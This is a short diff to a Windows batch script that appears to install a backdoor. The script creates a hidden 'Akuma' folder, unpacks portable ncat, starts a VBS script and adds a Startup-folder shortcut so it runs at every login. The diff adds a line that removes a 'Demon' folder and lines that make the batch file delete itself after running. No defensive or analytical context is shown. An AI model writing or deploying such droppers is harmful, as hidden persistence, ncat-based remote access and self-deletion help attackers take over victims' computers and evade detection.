@@ -1,5 +1,6 @@
 %homedrive%
 rmdir /s /q %homedrive%\Akuma
+rmdir /s /q %homedrive%\Demon
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
@@ -27,3 +28,5 @@ tar -xf ncat-portable-5.59BETA1.zip
 start %homedrive%\Akuma\Akuma.vbs
 echo y| del "%appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
+cd %~dp0
+del Akuma.bat
